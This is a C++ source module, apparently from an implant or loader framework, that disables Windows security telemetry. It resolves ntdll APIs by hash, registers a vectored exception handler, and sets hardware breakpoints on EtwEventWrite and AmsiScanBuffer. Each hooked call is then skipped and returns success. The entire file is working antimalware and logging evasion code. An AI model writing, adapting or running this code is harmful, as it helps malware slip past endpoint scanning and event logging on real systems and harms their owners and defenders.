#include <common.h>
#include <module.h>

#if defined(INCLUDE_EVASION_AMSI) || defined(INCLUDE_EVASION_ETW)

using namespace stardust;

namespace starburst {

// ── VEH handler ──
// Catches hardware breakpoint exceptions (EXCEPTION_SINGLE_STEP) fired by
// debug registers DR0 (EtwEventWrite) and DR1 (AmsiScanBuffer).
// Returns STATUS_SUCCESS / S_OK and skips the hooked function entirely.
// No globals needed - hook addresses live in the debug registers themselves.

static auto WINAPI declfn veh_hw_bp_handler(
    EXCEPTION_POINTERS* ep ) -> LONG
{
    if ( ep->ExceptionRecord->ExceptionCode != EXCEPTION_SINGLE_STEP )
        return EXCEPTION_CONTINUE_SEARCH;

    auto ctx  = ep->ContextRecord;
    auto addr = reinterpret_cast<uintptr_t>(
        ep->ExceptionRecord->ExceptionAddress );

    // Check if the fault address matches DR0 (ETW) or DR1 (AMSI)
    if ( addr == ctx->Dr0 || addr == ctx->Dr1 ) {
#ifdef _WIN64
        ctx->Rax = 0;
        ctx->Rip = *reinterpret_cast<uintptr_t*>( ctx->Rsp );
        ctx->Rsp += 8;
#else
        ctx->Eax = 0;
        ctx->Eip = *reinterpret_cast<uintptr_t*>( ctx->Esp );
        ctx->Esp += 4;
#endif
        return EXCEPTION_CONTINUE_EXECUTION;
    }

    return EXCEPTION_CONTINUE_SEARCH;
}

// ── Install the VEH handler (once) ──

static auto declfn ensure_veh_installed( instance& inst ) -> bool {
#if defined(INCLUDE_EVASION_AMSI) && defined(_WIN64)
    if ( inst.evasion.amsi_veh )
        return true;
#else
    // No amsi_veh field available - track via etw_patched as a proxy
    // (VEH is idempotent; worst case we register twice which is harmless)
#endif

    // Resolve RtlAddVectoredExceptionHandler from ntdll
    auto pAddVEH = reinterpret_cast<decltype(RtlAddVectoredExceptionHandler)*>(
        resolve::_api( inst.ntdll.handle,
            expr::hash_string( "RtlAddVectoredExceptionHandler" ) ) );

    if ( !pAddVEH ) return false;

    auto handle = pAddVEH( 1,
        reinterpret_cast<PVECTORED_EXCEPTION_HANDLER>( veh_hw_bp_handler ) );

    if ( !handle ) return false;

#if defined(INCLUDE_EVASION_AMSI) && defined(_WIN64)
    inst.evasion.amsi_veh = handle;
#endif

    return true;
}

// ── Set a hardware breakpoint on a given debug register ──
// dr_index: 0 = DR0 (ETW), 1 = DR1 (AMSI)

static auto declfn set_hw_breakpoint(
    instance& inst,
    void*     target_addr,
    int       dr_index ) -> bool
{
    // Resolve NtGetContextThread / NtSetContextThread from ntdll
    auto pNtGetCtx = reinterpret_cast<decltype(NtGetContextThread)*>(
        resolve::_api( inst.ntdll.handle,
            expr::hash_string( "NtGetContextThread" ) ) );

    auto pNtSetCtx = reinterpret_cast<decltype(NtSetContextThread)*>(
        resolve::_api( inst.ntdll.handle,
            expr::hash_string( "NtSetContextThread" ) ) );

    if ( !pNtGetCtx || !pNtSetCtx ) return false;

    // Use pseudo-handle -1 for current thread (NtCurrentThread)
    HANDLE hThread = reinterpret_cast<HANDLE>( static_cast<uintptr_t>( -2 ) );

    CONTEXT ctx   = {};
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    if ( pNtGetCtx( hThread, &ctx ) != 0 )
        return false;

#ifdef _WIN64
    auto addr = reinterpret_cast<DWORD64>( target_addr );
#else
    auto addr = reinterpret_cast<DWORD>( target_addr );
#endif

    switch ( dr_index ) {
        case 0: ctx.Dr0 = addr; break;
        case 1: ctx.Dr1 = addr; break;
        case 2: ctx.Dr2 = addr; break;
        case 3: ctx.Dr3 = addr; break;
        default: return false;
    }

    ctx.Dr7 |= ( static_cast<decltype(ctx.Dr7)>(1) << ( dr_index * 2 ) );

    if ( pNtSetCtx( hThread, &ctx ) != 0 )
        return false;

    return true;
}

#ifdef INCLUDE_EVASION_ETW
static auto declfn patch_etw( instance& inst ) -> bool {
    auto pEtwEventWrite = reinterpret_cast<void*>(
        resolve::_api( inst.ntdll.handle,
            expr::hash_string( "EtwEventWrite" ) ) );

    if ( !pEtwEventWrite ) return false;

    if ( !ensure_veh_installed( inst ) )
        return false;

    if ( !set_hw_breakpoint( inst, pEtwEventWrite, 0 ) )
        return false;

    return true;
}
#endif // INCLUDE_EVASION_ETW

#if defined(INCLUDE_EVASION_AMSI) && defined(_WIN64)
static auto declfn patch_amsi( instance& inst ) -> bool {
    auto h_amsi = inst.kernel32.LoadLibraryA(
        symbol<const char*>( "amsi.dll" ) );
    if ( !h_amsi ) return false;

    auto pAmsiScanBuffer = reinterpret_cast<void*>(
        resolve::_api( reinterpret_cast<uintptr_t>( h_amsi ),
            expr::hash_string( "AmsiScanBuffer" ) ) );
    if ( !pAmsiScanBuffer ) return false;

    if ( !ensure_veh_installed( inst ) )
        return false;

    if ( !set_hw_breakpoint( inst, pAmsiScanBuffer, 1 ) )
        return false;

    return true;
}
#endif // INCLUDE_EVASION_AMSI && _WIN64

// ── Public API ──

#ifdef INCLUDE_EVASION_ETW
auto declfn evasion_patch_etw( instance& inst ) -> void {
    if ( inst.evasion.etw_patched ) return;
    inst.evasion.etw_patched = patch_etw( inst );
    DBG_PRINT( inst, "ETW patch: %s\n",
        inst.evasion.etw_patched ?
            symbol<const char*>( "OK" ) :
            symbol<const char*>( "FAIL" ) );
}
#endif

#if defined(INCLUDE_EVASION_AMSI) && defined(_WIN64)
auto declfn evasion_patch_amsi( instance& inst ) -> void {
    if ( inst.evasion.amsi_patched ) return;
    inst.evasion.amsi_patched = patch_amsi( inst );
    DBG_PRINT( inst, "AMSI patch: %s\n",
        inst.evasion.amsi_patched ?
            symbol<const char*>( "OK" ) :
            symbol<const char*>( "FAIL" ) );
}
#endif

} // namespace starburst

#endif
